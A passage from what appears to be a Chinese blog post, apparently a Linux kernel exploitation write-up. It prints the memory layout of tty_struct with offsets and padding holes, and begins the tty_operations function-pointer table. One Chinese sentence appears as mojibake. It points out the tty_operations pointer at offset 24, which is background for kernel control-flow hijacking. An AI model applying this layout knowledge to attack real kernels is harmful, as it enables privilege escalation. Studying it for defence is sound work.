</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">atomic_write_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  136      |    40 */</span>    <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  136      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  140      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  160      |     8 */</span>        <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |     4 */</span>        <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |     4 */</span>            <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">legacy_mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  176      |    40 */</span>    <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  176      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  180      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  184      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  184      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  192      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  200      |     8 */</span>        <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  208      |     4 */</span>        <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  208      |     4 */</span>            <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">throttle_mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  216      |    40 */</span>    <span class="k">struct</span> <span class="n">rw_semaphore</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  216      |     8 */</span>        <span class="kt">long</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  224      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  224      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  232      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  240      |     4 */</span>        <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  244      |     4 */</span>        <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  244      |     4 */</span>            <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  248      |     8 */</span>        <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">termios_rwsem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  256      |    40 */</span>    <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  256      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  260      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  264      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  264      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  272      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  280      |     8 */</span>        <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  288      |     4 */</span>        <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  288      |     4 */</span>            <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">winsize_mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  296      |     4 */</span>    <span class="kt">spinlock_t</span> <span class="n">ctrl_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  300      |     4 */</span>    <span class="kt">spinlock_t</span> <span class="n">flow_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  304      |    44 */</span>    <span class="k">struct</span> <span class="n">ktermios</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  304      |     4 */</span>        <span class="kt">tcflag_t</span> <span class="n">c_iflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  308      |     4 */</span>        <span class="kt">tcflag_t</span> <span class="n">c_oflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  312      |     4 */</span>        <span class="kt">tcflag_t</span> <span class="n">c_cflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  316      |     4 */</span>        <span class="kt">tcflag_t</span> <span class="n">c_lflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  320      |     1 */</span>        <span class="kt">cc_t</span> <span class="n">c_line</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  321      |    19 */</span>        <span class="kt">cc_t</span> <span class="n">c_cc</span><span class="p">[</span><span class="mi">19</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  340      |     4 */</span>        <span class="kt">speed_t</span> <span class="n">c_ispeed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  344      |     4 */</span>        <span class="kt">speed_t</span> <span class="n">c_ospeed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   44 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">termios</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  348      |    44 */</span>    <span class="k">struct</span> <span class="n">ktermios</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  348      |     4 */</span>        <span class="kt">tcflag_t</span> <span class="n">c_iflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  352      |     4 */</span>        <span class="kt">tcflag_t</span> <span class="n">c_oflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  356      |     4 */</span>        <span class="kt">tcflag_t</span> <span class="n">c_cflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  360      |     4 */</span>        <span class="kt">tcflag_t</span> <span class="n">c_lflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  364      |     1 */</span>        <span class="kt">cc_t</span> <span class="n">c_line</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  365      |    19 */</span>        <span class="kt">cc_t</span> <span class="n">c_cc</span><span class="p">[</span><span class="mi">19</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  384      |     4 */</span>        <span class="kt">speed_t</span> <span class="n">c_ispeed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  388      |     4 */</span>        <span class="kt">speed_t</span> <span class="n">c_ospeed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   44 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">termios_locked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  392      |     8 */</span>    <span class="k">struct</span> <span class="n">termiox</span> <span class="o">*</span><span class="n">termiox</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  400      |    64 */</span>    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  464      |     8 */</span>    <span class="k">struct</span> <span class="n">pid</span> <span class="o">*</span><span class="n">pgrp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  472      |     8 */</span>    <span class="k">struct</span> <span class="n">pid</span> <span class="o">*</span><span class="n">session</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  480      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  488      |     4 */</span>    <span class="kt">int</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  492      |     8 */</span>    <span class="k">struct</span> <span class="n">winsize</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  492      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ws_row</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  494      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ws_col</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  496      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ws_xpixel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  498      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ws_ypixel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">winsize</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  496:31   |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nl">stopped</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  496:30   |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nl">flow_stopped</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  6-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  3-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  504: 2   |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nl">unused</span> <span class="p">:</span> <span class="mi">62</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  2-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  512      |     4 */</span>    <span class="kt">int</span> <span class="n">hw_stopped</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  512:24   |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nl">ctrl_status</span> <span class="p">:</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  512:23   |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nl">packet</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  7-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  2-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  520: 9   |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nl">unused_ctrl</span> <span class="p">:</span> <span class="mi">55</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  1-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  1-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  528      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">receive_room</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  532      |     4 */</span>    <span class="kt">int</span> <span class="n">flow_change</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  536      |     8 */</span>    <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">link</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  544      |     8 */</span>    <span class="k">struct</span> <span class="n">fasync_struct</span> <span class="o">*</span><span class="n">fasync</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  552      |     4 */</span>    <span class="kt">int</span> <span class="n">alt_speed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  560      |    24 */</span>    <span class="kt">wait_queue_head_t</span> <span class="n">write_wait</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  584      |    24 */</span>    <span class="kt">wait_queue_head_t</span> <span class="n">read_wait</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  608      |    32 */</span>    <span class="k">struct</span> <span class="n">work_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  608      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  616      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  616      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  624      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  632      |     8 */</span>        <span class="kt">work_func_t</span> <span class="n">func</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">hangup_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  640      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">disc_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  648      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">driver_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  656      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  656      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  664      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">tty_files</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  672      |     4 */</span>    <span class="kt">int</span> <span class="n">closing</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  680      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">write_buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  688      |     4 */</span>    <span class="kt">int</span> <span class="n">write_cnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  696      |    32 */</span>    <span class="k">struct</span> <span class="n">work_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  696      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  704      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  704      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  712      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  720      |     8 */</span>        <span class="kt">work_func_t</span> <span class="n">func</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">SAK_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  728      |     8 */</span>    <span class="k">struct</span> <span class="n">tty_port</span> <span class="o">*</span><span class="n">port</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes):  736 */</span>
</span></span><span class="line"><span class="cl">                         <span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¤§å°ä¸º<code>0x2e0</code>ï¼Œåœ¨åç§»ä¸º<code>24</code>çš„åœ°æ–¹ï¼Œæœ‰ä¸€ä¸ªç»“æ„ä½“<code>tty_operations</code>ï¼Œå­˜å‚¨ç€å¤§é‡çš„å‡½æ•°æŒ‡é’ˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* offset    |  size */</span>  <span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">tty_operations</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |     8 */</span>    <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">lookup</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    8      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">install</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   16      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">remove</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   24      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">open</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   32      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">close</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   40      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">shutdown</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   48      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">cleanup</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">write</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   64      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">put_char</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   72      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">flush_chars</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   80      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">write_room</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   88      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">chars_in_buffer</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   96      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ioctl</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  104      |     8 */</span>    <span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">compat_ioctl</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  112      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">set_termios</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">ktermios</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  120      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">throttle</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
